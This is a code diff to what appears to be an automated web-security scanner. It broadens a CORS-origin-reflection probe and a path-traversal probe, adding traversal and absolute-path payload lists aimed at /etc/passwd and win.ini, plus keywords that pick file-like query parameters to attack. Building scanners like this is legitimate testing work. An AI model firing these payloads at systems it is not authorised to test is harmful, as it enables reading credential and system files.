@@ -1295,25 +1295,36 @@ def cors_probe(model, base_url: str, *, session: requests.Session | None = None,
     sess = session or requests.Session()
     base = base_url.rstrip("/")
     out: list[ProbeFinding] = []
-    try:
-        r = sess.get(base + "/", headers={"Origin": _EVIL_ORIGIN}, timeout=15)
-    except Exception:
-        return out
-    acao = (r.headers.get("Access-Control-Allow-Origin") or "").strip()
-    acac = (r.headers.get("Access-Control-Allow-Credentials") or "").strip().lower()
-    if acao == _EVIL_ORIGIN:
-        creds = acac == "true"
-        out.append(ProbeFinding(
-            probe="cors",
-            title="CORS reflects an arbitrary Origin" + (" with credentials" if creds else ""),
-            exploited=True, severity="P2" if creds else "P3",
-            evidence=("Request with Origin: %s was answered with Access-Control-Allow-Origin: %s%s. "
-                      "The app trusts any site's origin, so a malicious page can make cross-origin "
-                      "requests%s." % (_EVIL_ORIGIN, acao,
+    # Test the root AND a sample of GET endpoints — CORS is often misconfigured on a
+    # specific handler, not the root. One reflecting endpoint proves it, so stop there.
+    targets = ["/"]
+    for e in getattr(model, "endpoints", []):
+        if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET":
+            p = re.sub(r"\{[^}]+\}", "1", str(e.get("path", "")))
+            if p and p not in targets:
+                targets.append(p)
+    for path in targets[:15]:
+        try:
+            r = sess.get(base + path, headers={"Origin": _EVIL_ORIGIN}, timeout=15)
+        except Exception:
+            continue
+        acao = (r.headers.get("Access-Control-Allow-Origin") or "").strip()
+        acac = (r.headers.get("Access-Control-Allow-Credentials") or "").strip().lower()
+        if acao == _EVIL_ORIGIN:
+            creds = acac == "true"
+            out.append(ProbeFinding(
+                probe="cors",
+                title="CORS reflects an arbitrary Origin" + (" with credentials" if creds else "")
+                      + (f" on {path}" if path != "/" else ""),
+                exploited=True, severity="P2" if creds else "P3",
+                evidence=("Request to %s with Origin: %s was answered with Access-Control-Allow-Origin: "
+                          "%s%s. The app trusts any site's origin, so a malicious page can make "
+                          "cross-origin requests%s." % (path, _EVIL_ORIGIN, acao,
                                        " and Access-Control-Allow-Credentials: true" if creds else "",
                                        " and read the victim's authenticated responses" if creds
                                        else " to this API")),
-            target="/"))
+                target=path))
+            break   # one proof is enough
     return out
 
 
@@ -1321,20 +1332,31 @@ def cors_probe(model, base_url: str, *, session: requests.Session | None = None,
 _TRAVERSAL_SIGS = (re.compile(r"root:.*:0:0:"),            # /etc/passwd
                    re.compile(r"\[extensions\]", re.I),    # Windows win.ini
                    re.compile(r"for 16-bit app support", re.I))
+# For a {path} segment: classic traversal (incl. a pre-encoded variant).
 _TRAVERSAL_PAYLOADS = ("../../../../../../etc/passwd",
                        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
                        "....//....//....//....//etc/passwd",
                        "../../../../../../windows/win.ini")
+# For a query param: raw payloads (requests encodes them), plus ABSOLUTE paths — many
+# file-read handlers accept an absolute path with no traversal needed.
+_TRAVERSAL_QUERY_PAYLOADS = ("/etc/passwd", "../../../../../../etc/passwd",
+                             "....//....//....//....//etc/passwd",
+                             "C:\\windows\\win.ini", "../../../../../../windows/win.ini")
+# Query-parameter names that commonly feed a filesystem path.
+_FILE_PARAM_KW = ("file", "filename", "filepath", "path", "dir", "folder", "document",
+                  "doc", "template", "download", "attachment", "load", "read", "view",
+                  "page", "log", "resource", "include")
 
 
 def path_traversal_probe(model, base_url: str, *, session: requests.Session | None = None,
                          auth: dict | None = None) -> list[ProbeFinding]:
     """
-    Path traversal / local file inclusion (OWASP). For GET endpoints with a path
-    parameter, substitute classic traversal payloads and confirm ONLY when the
-    response body contains an unmistakable OS-file signature (e.g. /etc/passwd's
-    `root:...:0:0:`). A benign value never contains it, so this is a proven P1 read
-    of a file outside the web root — not a guess. No model calls.
+    Path traversal / local file inclusion (OWASP). For GET endpoints that build a file
+    path from a PATH parameter or a file-ish QUERY parameter (filename, path, ...), we
+    send traversal and absolute-path payloads and confirm ONLY when the response body
+    contains an unmistakable OS-file signature (e.g. /etc/passwd's `root:...:0:0:`).
+    A benign value never contains it, so this is a proven P1 read of a file outside the
+    web root — not a guess. No model calls.
     """
     sess = session or requests.Session()
     from core.auth_recipe import derive_auth_recipe
@@ -1342,39 +1364,65 @@ def path_traversal_probe(model, base_url: str, *, session: requests.Session | No
     base = base_url.rstrip("/")
     out: list[ProbeFinding] = []
 
-    cands = [e for e in getattr(model, "endpoints", [])
-             if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
-             and "{" in str(e.get("path", ""))]
+    gets = [e for e in getattr(model, "endpoints", [])
+            if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"]
+    path_cands = [e for e in gets if "{" in str(e.get("path", ""))]
+    query_cands = [(e, qp) for e in gets for qp in (e.get("query_params") or [])
+                   if any(k in str(qp).lower() for k in _FILE_PARAM_KW)]
     token = None
-    if any(e.get("auth_required") for e in cands):
+    if any(e.get("auth_required") for e in path_cands) or any(e.get("auth_required") for e, _ in query_cands):
         token = _resolve_token(sess, base, recipe, model, f"trav_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
 
-    for e in cands[:5]:
+    def _signature_hit(r):
+        return any(sig.search(r.text or "") for sig in _TRAVERSAL_SIGS)
+
+    # Path parameters: substitute the payload into the {segment}.
+    for e in path_cands[:5]:
         path = str(e.get("path", ""))
         m = re.search(r"\{([^}]+)\}", path)
         if not m:
             continue
         param = m.group(1)
         headers = _auth_headers(token, auth) if e.get("auth_required") else {}
-        hit = None
         for payload in _TRAVERSAL_PAYLOADS:
-            url = f"{base}{path.replace('{' + param + '}', payload)}"
             try:
-                r = sess.get(url, headers=headers, timeout=15)
+                r = sess.get(f"{base}{path.replace('{' + param + '}', payload)}", headers=headers, timeout=15)
             except Exception:
                 continue
-            if any(sig.search(r.text or "") for sig in _TRAVERSAL_SIGS):
-                hit = (payload, r.status_code)
+            if _signature_hit(r):
+                out.append(ProbeFinding(
+                    probe="path-traversal",
+                    title=f"Path traversal / local file read via path param '{param}' on {path}",
+                    exploited=True, severity="P1",
+                    evidence=(f"GET {path} with '{param}'='{payload}' returned an OS file's contents "
+                              f"(HTTP {r.status_code}; matched /etc/passwd or win.ini). The parameter "
+                              f"builds a filesystem path without sanitisation."),
+                    target=path))
                 break
-        if hit:
-            out.append(ProbeFinding(
-                probe="path-traversal",
-                title=f"Path traversal / local file read via path param '{param}' on {path}",
-                exploited=True, severity="P1",
-                evidence=(f"GET {path} with '{param}'='{hit[0]}' returned an OS file's contents "
-                          f"(HTTP {hit[1]}; matched a /etc/passwd or win.ini signature). The "
-                          f"parameter is used to build a filesystem path without sanitisation."),
-                target=path))
+
+    # File-ish query parameters: send the payload as that query value.
+    seen: set = set()
+    for e, qp in query_cands[:6]:
+        path = re.sub(r"\{[^}]+\}", "1", str(e.get("path", "")))
+        if (path, qp) in seen:
+            continue
+        seen.add((path, qp))
+        headers = _auth_headers(token, auth) if e.get("auth_required") else {}
+        for payload in _TRAVERSAL_QUERY_PAYLOADS:
+            try:
+                r = sess.get(f"{base}{path}", params={qp: payload}, headers=headers, timeout=15)
+            except Exception:
+                continue
+            if _signature_hit(r):
+                out.append(ProbeFinding(
+                    probe="path-traversal",
+                    title=f"Path traversal / local file read via query param '{qp}' on {path}",
+                    exploited=True, severity="P1",
+                    evidence=(f"GET {path}?{qp}={payload} returned an OS file's contents "
+                              f"(HTTP {r.status_code}; matched /etc/passwd or win.ini). The parameter "
+                              f"builds a filesystem path without sanitisation."),
+                    target=path))
+                break
     return out
 
 
